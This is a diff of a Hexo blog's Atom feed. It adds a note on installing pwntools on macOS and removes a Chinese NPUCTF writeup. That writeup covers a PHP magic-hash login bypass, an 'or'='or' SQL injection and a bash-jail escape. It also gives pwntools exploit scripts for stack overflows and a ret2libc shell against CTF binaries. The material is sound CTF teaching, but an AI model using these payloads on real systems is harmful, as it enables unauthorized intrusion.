@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://iosmosis.github.io/"/>
-  <updated>2018-11-29T08:02:08.223Z</updated>
+  <updated>2018-12-16T08:19:27.529Z</updated>
   <id>http://iosmosis.github.io/</id>
   
   <author>
@@ -16,11 +16,40 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>macOS Mojave install pwntools Solved</title>
+    <link href="http://iosmosis.github.io/2018/12/16/macOS-Mojave-install-pwntools-Solved/"/>
+    <id>http://iosmosis.github.io/2018/12/16/macOS-Mojave-install-pwntools-Solved/</id>
+    <published>2018-12-16T08:15:08.000Z</published>
+    <updated>2018-12-16T08:19:27.529Z</updated>
+    
+    <content type="html"><![CDATA[<p>Mojave 直接安装pwntools会报错</p>
+<p>主要报错原因是因为 capstone 和 unicorn 安装的问题</p>
+<p>这里贴出解决办法</p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">brew <span class="token function">install</span> capstone <span class="token operator">&amp;&amp;</span> <span class="token function">export</span> MACOS_UNIVERSAL<span class="token operator">=</span>no <span class="token operator">&amp;&amp;</span> pip <span class="token function">install</span> capstone
+brew <span class="token function">install</span> unicorn <span class="token operator">&amp;&amp;</span> UNICORN_QEMU_FLAGS<span class="token operator">=</span><span class="token string">"--python=<span class="token variable"><span class="token variable">`</span><span class="token function">whereis</span> python<span class="token variable">`</span></span>"</span> pip <span class="token function">install</span> unicorn
+</code></pre>
+<p>之后再运行安装即可</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Mojave 直接安装pwntools会报错&lt;/p&gt;
+&lt;p&gt;主要报错原因是因为 capstone 和 unicorn 安装的问题&lt;/p&gt;
+&lt;p&gt;这里贴出解决办法&lt;/p&gt;
+&lt;p&gt;&lt;/p&gt;&lt;p class=&quot;code-caption&quot; data-lang=&quot;bash&quot; data
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
     <title>Use after free</title>
     <link href="http://iosmosis.github.io/2018/11/29/Use-after-free/"/>
     <id>http://iosmosis.github.io/2018/11/29/Use-after-free/</id>
     <published>2018-11-29T08:02:08.000Z</published>
-    <updated>2018-11-29T08:02:08.223Z</updated>
+    <updated>2018-12-13T10:28:09.841Z</updated>
     
     <summary type="html">
     
@@ -34,7 +63,7 @@
     <link href="http://iosmosis.github.io/2018/11/18/kernel-core/"/>
     <id>http://iosmosis.github.io/2018/11/18/kernel-core/</id>
     <published>2018-11-18T15:27:12.000Z</published>
-    <updated>2018-11-29T08:00:33.367Z</updated>
+    <updated>2018-11-29T08:00:32.000Z</updated>
     
     <content type="html"><![CDATA[<p>感谢CTF-wiki、P4nda、Veritas501  收获很大</p>
 <p>首先捋清kernel pwn 与 用户态下的pwn的区别</p>
@@ -731,7 +760,7 @@ uid<span class="token operator">=</span>0<span class="token punctuation">(</span
     <link href="http://iosmosis.github.io/2018/11/16/unlink-stkof/"/>
     <id>http://iosmosis.github.io/2018/11/16/unlink-stkof/</id>
     <published>2018-11-16T14:23:53.000Z</published>
-    <updated>2018-11-18T15:26:23.034Z</updated>
+    <updated>2018-11-18T15:26:22.000Z</updated>
     
     <content type="html"><![CDATA[<p>首先理解下unlink操作 </p>
 <p>初始三个chunk大小都为0x80</p>
@@ -1225,7 +1254,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
     <link href="http://iosmosis.github.io/2018/11/09/GDB-attach-pid%E6%B2%A1%E6%9C%89%E6%9D%83%E9%99%90%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
     <id>http://iosmosis.github.io/2018/11/09/GDB-attach-pid没有权限解决方法/</id>
     <published>2018-11-09T07:22:27.000Z</published>
-    <updated>2018-11-09T07:52:23.899Z</updated>
+    <updated>2018-11-09T07:52:22.000Z</updated>
     
     <content type="html"><![CDATA[<p>gab调试时遇到</p>
 <p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
@@ -1267,7 +1296,7 @@ ptrace: 不允许的操作.
     <link href="http://iosmosis.github.io/2018/10/29/SUSCTF-Writeup-Reverse/"/>
     <id>http://iosmosis.github.io/2018/10/29/SUSCTF-Writeup-Reverse/</id>
     <published>2018-10-29T08:04:11.000Z</published>
-    <updated>2018-10-29T12:11:55.869Z</updated>
+    <updated>2018-10-29T12:11:54.000Z</updated>
     
     <content type="html"><![CDATA[<h3 id="60"><a href="#60" class="headerlink" title="60"></a>60</h3><p><img src="/2018/10/29/SUSCTF-Writeup-Reverse/1.png" alt=""><br>下载载入IDA 查看</p>
 <p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
@@ -4690,9 +4719,9 @@ S <span class="token operator">=</span> Solver<span class="token punctuation">(<
     
       <category term="WEB" scheme="http://iosmosis.github.io/tags/WEB/"/>
     
-      <category term="BUPT" scheme="http://iosmosis.github.io/tags/BUPT/"/>
-    
       <category term="RE" scheme="http://iosmosis.github.io/tags/RE/"/>
+    
+      <category term="BUPT" scheme="http://iosmosis.github.io/tags/BUPT/"/>
     
   </entry>
   
@@ -4761,360 +4790,11 @@ ios@ubuntu:~$
     
       <category term="Pwn" scheme="http://iosmosis.github.io/tags/Pwn/"/>
     
+      <category term="Syclover" scheme="http://iosmosis.github.io/tags/Syclover/"/>
+    
       <category term="栈溢出" scheme="http://iosmosis.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
     
       <category term="writeup" scheme="http://iosmosis.github.io/tags/writeup/"/>
-    
-      <category term="Syclover" scheme="http://iosmosis.github.io/tags/Syclover/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>NPUCTF部分Writeup</title>
-    <link href="http://iosmosis.github.io/2018/05/13/NPUCTF%E2%96%93%E2%94%90%E2%95%96%E2%95%93Writeup/"/>
-    <id>http://iosmosis.github.io/2018/05/13/NPUCTF▓┐╖╓Writeup/</id>
-    <published>2018-05-13T07:39:42.000Z</published>
-    <updated>2018-05-27T11:00:04.000Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p><img src="/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/1.jpg" alt="ida1"></p>
-<p>查看源码<br><img src="/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/2.jpg" alt="ida1"><br>得到Flag : flag{begin_to_npuctf}</p>
-<ul>
-<li><a id="more"></a>
-<the rest="" of="" contents="" |="" 余下全文=""><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2></the></li>
-</ul>
-<p><img src="/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/3.jpg" alt="ida1"><br>猜测应该是js算法题目</p>
-<p>查看源码发现主要算法<br><img src="/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/4.jpg" alt="ida1"></p>
-<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>可以看到</p>
-<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre><code>var b = &quot;56ab34c15b73a457069c58a43fcfc640&quot;;
-var d = 0x0;
-var e = a.substr(0x8, 0x5);
-if ($.md5(e) == b.replace(/3/ig, ++d+1).replace(/8/ig, &#39;e&#39;))
-</code></pre><p>通过控制台可以获得e<br><img src="/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/5.jpg" alt="ida1"><br>解密可以获得9-13位 happy</p>
-<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre><code>if (f.substr(0x5, 0x2) == &quot;be&quot; &amp;&amp; $.md5(f.substr(0x0 / d, d + 0x3)) == &quot;327a6c4304ad5938eaf0efb6cc3e53dc&quot;) {
-</code></pre><p>可得 6 7位为 be<br>解密  327a6c4304ad5938eaf0efb6cc3e53dc 可获得 0-3位为 flag</p>
-<p><img src="/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/6.jpg" alt="ida1"></p>
-<p>运行可以获得g=np</p>
-<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre><code>if (r.substr((++d) * 0x3, 0x6) == g.concat(&quot;uctf&quot;) &amp;&amp; c.test(a)) {
-</code></pre><p>分析可知 得到的g和uctf进行拼接 得到 npuctf 15-22位</p>
-<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre><code>&lt;pre name=&quot;code&quot; class=&quot;javascript&quot; style=&quot;font-size: 13.3333px;&quot;&gt;r.charCodeAt(--d) - 0x19 == r.charCodeAt(--d) //r[1]-0x19==r[0]
-之后根据正则可知r[0]=&#39;_&#39;
-</code></pre><p> 倒回去看r变量的判断</p>
-<p>0的值为_下划线unicode码加25</p>
-<p>所以在控制台输入下面3条代码，即可得r两个相同的字符为xx</p>
-<p>var r = ‘_’</p>
-<p>console.log(r.charCodeAt(0))</p>
-<p>console.log(String.fromCharCode(95+25))<br>所以最后拼接可得<br>flag{be_happy_xxnpuctf}</p>
-<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p>题目：你需要懂一些Linux命令，已经为你装好了某著名黑客工具。<br><img src="/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/7.jpg" alt="ida1"><br>测试可知 可以执行一些命令 并且 ls列出了flag所在目录<br><img src="/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/8.jpg" alt="ida1"><br>但是却无法使用 cd cat 等一系列命令</p>
-<p>右键查看源码<br><img src="/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/9.jpg" alt="ida1"><br>发现提示 可以猜测应该 是可以使用nmap<br>所以使用命令 </p>
-<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre><code>nmap -iL /tmp/flag/flag.txt
-</code></pre><p><img src="/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/10.jpg" alt="ida1"><br>得到Flag : flag{nice_Command}</p>
-<h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p><img src="/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/11.jpg" alt="ida1"><br>进入发现需要登录</p>
-<p>右键查看源码得到提示<br><img src="/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/12.jpg" alt="ida1"><br>这里存在PHP弱类型漏洞 提交name=240610708 pass=QNKCDZO 成功绕过</p>
-<p><img src="/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/13.jpg" alt="ida1"></p>
-<h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p> 根据放的hint可尝试万能密码绕过<br>提交 ‘or’=’or’ 成功绕过</p>
-<p><img src="/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/14.jpg" alt="ida1"></p>
-<h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p>提示了name为 npusec 但是密码未知所以这里猜测需要爆破密码</p>
-<p>通过robots.txt泄露 </p>
-<p><img src="/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/15.jpg" alt="ida1"><br>得到 密码字典 所以进行爆破即可</p>
-<p><img src="/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/16.jpg" alt="ida1"><br>得到密码为 1234npuuu<br><img src="/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/17.jpg" alt="ida1"><br>登录获得Flag : flag{W3lcOme_com3_to_ctf}</p>
-<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="pwn-checkin"><a href="#pwn-checkin" class="headerlink" title="pwn_checkin"></a>pwn_checkin</h2><p>载入ida分析</p>
-<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-48h]</span>
-
-  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"why not you input something?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-</code></pre>
-<p>漏洞存在于gets函数<br>继续分析 </p>
-<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre><code>int call_system()
-{
-  return system(&quot;/bin/sh&quot;);
-}
-</code></pre><p>题目中提供了shell所以 只需要溢出 修改ret到 call_system 地址即可</p>
-<p>offset = rbp-48h -(rbp-0x4)</p>
-<p>所以构造exp</p>
-<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-<span class="token comment" spellcheck="true">#p = process('./checkin')</span>
-p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'149.28.142.91'</span><span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span>
-sys_addr <span class="token operator">=</span> <span class="token number">0x080484EB</span>
-
-payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x48</span> <span class="token operator">+</span><span class="token string">'aaaa'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>
-<span class="token keyword">print</span> payload
-<span class="token comment" spellcheck="true">#p.recv('why not you input something?')</span>
-p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
-</code></pre>
-<h2 id="baby-bashjail"><a href="#baby-bashjail" class="headerlink" title="baby_bashjail"></a>baby_bashjail</h2><p>载入ida分析</p>
-<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
-{
-  char s; // [rsp+0h] [rbp-20h]
-  unsigned __int64 v5; // [rsp+18h] [rbp-8h]
-
-  v5 = __readfsqword(0x28u);
-  setvbuf(stdin, 0LL, 2, 0LL);
-  setvbuf(stdout, 0LL, 2, 0LL);
-  puts(&quot;======baby jail======&quot;);
-  while ( 1 )
-  {
-    putchar(62);
-    fgets(&amp;s, 20, stdin);
-    if ( (unsigned int)filter(&amp;s, 20LL) )
-      break;
-    system(&amp;s);
-  }
-  putchar(62);
-  puts(&quot;No way! Little Hacker!&quot;);
-  return 0;
-}
-</code></pre><p>发现程序提供了system 但是 使用前使用filter进行参数的判断<br>查看 filter函数</p>
-<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre><code>_int64 __fastcall filter(const char *a1)
-{
-  int i; // [rsp+18h] [rbp-8h]
-  int v3; // [rsp+1Ch] [rbp-4h]
-
-  v3 = strlen(a1);
-  for ( i = 0; i &lt; v3; ++i )
-  {
-    switch ( a1[i] )
-    {
-      case &#39;l&#39;:
-        return 1LL;
-      case &#39;s&#39;:
-        return 1LL;
-      case &#39;c&#39;:
-        return 1LL;
-    }
-    switch ( a1[i] )
-    {
-      case &#39;a&#39;:
-        return 1LL;
-      case &#39;t&#39;:
-        return 1LL;
-      case &#39;f&#39;:
-        return 1LL;
-      case &#39;l&#39;:
-        return 1LL;
-      case &#39;g&#39;:
-        return 1LL;
-      case &#39;*&#39;:
-        return 1LL;
-      case &#39;c&#39;:
-        return 1LL;
-    }
-  }
-  return deep_filter(a1);
-}
-</code></pre><p>进行判断检查 不能存在这些关键字母 并传入depp_filter<br>查看deep_filter</p>
-<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre><code>signed __int64 __fastcall deep_filter(const char *a1)
-{
-  int i; // [rsp+18h] [rbp-8h]
-  int v3; // [rsp+1Ch] [rbp-4h]
-
-  v3 = strlen(a1);
-  for ( i = 0; i &lt; v3; ++i )
-  {
-    switch ( a1[i] )
-    {
-      case &#39;b&#39;:
-        return 1LL;
-      case &#39;d&#39;:
-        return 1LL;
-      case &#39;e&#39;:
-        return 1LL;
-      case &#39;h&#39;:
-        return 1LL;
-      case &#39;i&#39;:
-        return 1LL;
-      case &#39;j&#39;:
-        return 1LL;
-      case &#39;k&#39;:
-        return 1LL;
-      case &#39;m&#39;:
-        return 1LL;
-      case &#39;n&#39;:
-        return 1LL;
-      case &#39;o&#39;:
-        return 1LL;
-      case &#39;p&#39;:
-        return 1LL;
-      case &#39;q&#39;:
-        return 1LL;
-      case &#39;r&#39;:
-        return 1LL;
-      case &#39;s&#39;:
-        return 1LL;
-      case &#39;u&#39;:
-        return 1LL;
-      case &#39;v&#39;:
-        return 1LL;
-      case &#39;w&#39;:
-        return 1LL;
-      case &#39;x&#39;:
-        return 1LL;
-      case &#39;y&#39;:
-        return 1LL;
-      case &#39;z&#39;:
-        return 1LL;
-    }
-  }
-  return 0LL;
-}
-</code></pre><p>哇 这么狠 原来就是把所有字母都过滤的<br>但是题目需要利用system进行flag的获取<br>argv[0]相当于 sh<br>所以 只需要传入 $0 就可以获取一个shell</p>
-<p>EXP</p>
-<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-
-p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'149.28.142.91'</span><span class="token punctuation">,</span><span class="token number">10002</span><span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'$0'</span><span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
-</code></pre>
-<h2 id="Warrior-Tales"><a href="#Warrior-Tales" class="headerlink" title="Warrior_Tales"></a>Warrior_Tales</h2><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ checksec warrior_tales
-<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/warrior_tales'</span>
-    Arch:     i386-32-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
-ios@ubuntu:~$
-</code></pre>
-<p>开启NX和RELRO</p>
-<p>载入IDA分析 漏洞存在于vlun函数里</p>
-<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">vlun</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-30h]</span>
-
-  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Hero! Now, write something for your story!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//漏洞利用点</span>
-  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What a wonderful ending!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-</code></pre>
-<p>但是由于RELRO开启不能直接利用libc构造rop 必须leak出真实地址进而获得system_addr<br>之前由于偏移写错导致leak一直有问题0.0<br>通过构造循环来leak puts_addr<br>这里构造思路有两种<br>第一种</p>
-<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-python"><code class="language-python">puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
-puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
-vlun_addr <span class="token operator">=</span> <span class="token number">0x08048659</span>
-
-payload1 <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">52</span><span class="token operator">+</span> p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>vlun_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>
-</code></pre>
-<p>通过vlun函数循环进行leak</p>
-<p>第二种</p>
-<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre><code>puts_plt = elf.symbols[&#39;puts&#39;]
-puts_got = elf.got[&#39;puts&#39;]
-start_addr = 0x080484D0
-payload1 = &quot;A&quot;*52+ p32(puts_plt) + p32(start_addr) + p32(puts_got)
-</code></pre><p>通过循环程序进行leak</p>
-<p>可以获得puts_addr</p>
-<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x59 bytes:
-    00000000  57 68 61 74  20 61 20 77  6f 6e 64 65  72 66 75 6c  │What│ a w│onde│rful│
-    00000010  20 65 6e 64  69 6e 67 21  0a a0 1c d9  f7 40 a5 d4  │ end│ing<span class="token operator">!</span>│····│·@··│
-    00000020  f7 60 23 d9  f7 20 39 d9  f7 c0 e0 d8  f7 0a 48 65  │·`<span class="token comment" spellcheck="true">#·│· 9·│····│··He│</span>
-    00000030  72 6f 21 20  4e 6f 77 2c  20 77 72 69  74 65 20 73  │ro<span class="token operator">!</span> │Now,│ wri│te s│
-    00000040  6f 6d 65 74  68 69 6e 67  20 66 6f 72  20 79 6f 75  │omet│hing│ for│ you│
-    00000050  72 20 73 74  6f 72 79 21  0a                        │r st│ory<span class="token operator">!</span>│·│
-    00000059
-puts_addr<span class="token operator">=</span> 0xf7d91ca0
-<span class="token punctuation">[</span>*<span class="token punctuation">]</span> system <span class="token operator">=</span> 0xf7d6cda0
-</code></pre>
-<p>由于服务器关闭 这里本地进行getshell</p>
-<p>exp</p>
-<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre><code>from pwn import *
-from struct import pack
-
-context.log_level = &#39;debug&#39; 
-#libc = ELF(&#39;libc.so.6&#39;)
-libc = ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)
-elf = ELF(&#39;warrior_tales&#39;)
-
-p1 = process(&#39;./warrior_tales&#39;)
-log.info(p1.recvuntil(&quot;&gt;&quot;))
-p1.sendline(&#39;ios&#39;)
-log.info(p1.recvuntil(&quot;select your choice:&quot;))
-p1.sendline(&#39;2&#39;)
-log.info(p1.recvuntil(&quot;select your choice:&quot;))
-p1.sendline(&#39;2&#39;)
-log.info(p1.recvuntil(&quot;select your choice:&quot;))
-p1.sendline(&#39;2&#39;)
-log.info(p1.recvuntil(&quot;select your choice:&quot;))
-p1.sendline(&#39;2&#39;)
-log.info(p1.recvuntil(&quot;select your choice:&quot;))
-p1.sendline(&#39;2&#39;)
-log.info(p1.recvuntil(&quot;select your choice:&quot;))
-p1.sendline(&#39;2&#39;)
-log.info(p1.recvuntil(&quot;select your choice:&quot;))
-p1.sendline(&#39;1&#39;)
-log.info(p1.recvuntil(&quot;Hero! Now, write something for your story!&quot;))
-
-
-
-puts_plt = elf.symbols[&#39;puts&#39;]
-puts_got = elf.got[&#39;puts&#39;]
-vlun_addr = 0x08048659
-gdb.attach(p1,&#39;b *0x08048659&#39;)
-raw_input(&#39;Go!!!&#39;)
-payload1 = &quot;A&quot;*52+ p32(puts_plt) + p32(vlun_addr) + p32(puts_got)
-p1.sendline(payload1)
-p1.recvuntil(&#39;What a wonderful ending!\n&#39;)
-data=u32(p1.recv(4))
-puts_addr=data
-print &#39;puts_addr= &#39;+hex(puts_addr)
-
-system=libc.symbols[&#39;system&#39;]-libc.symbols[&#39;puts&#39;]+puts_addr
-log.info(&#39;system = &#39; + hex(system))
-binsh=next(libc.search(&#39;/bin/sh&#39;))-libc.symbols[&#39;puts&#39;]+puts_addr
-
-payload=&quot;A&quot;*52+p32(system)+p32(1)+p32(binsh)
-p1.sendline(payload)
-
-p1.interactive()
-</code></pre><p>运行结果</p>
-<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-bash"><code class="language-bash">$ <span class="token function">whoami</span>
-<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0x7 bytes:
-    <span class="token string">'whoami\n'</span>
-<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x4 bytes:
-    <span class="token string">'ios\n'</span>
-ios
-$
-</code></pre>
-<p>最后感谢下 kaka师傅指出我的错误(0~0) </p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h1&gt;&lt;h2 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/1.jpg&quot; alt=&quot;ida1&quot;&gt;&lt;/p&gt;
-&lt;p&gt;查看源码&lt;br&gt;&lt;img src=&quot;/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/2.jpg&quot; alt=&quot;ida1&quot;&gt;&lt;br&gt;得到Flag : flag{begin_to_npuctf}&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;
-    
-    </summary>
-    
-    
-      <category term="Pwn" scheme="http://iosmosis.github.io/tags/Pwn/"/>
-    
-      <category term="writeup" scheme="http://iosmosis.github.io/tags/writeup/"/>
-    
-      <category term="NPUCTF" scheme="http://iosmosis.github.io/tags/NPUCTF/"/>
-    
-      <category term="WEB" scheme="http://iosmosis.github.io/tags/WEB/"/>
     
   </entry>
   
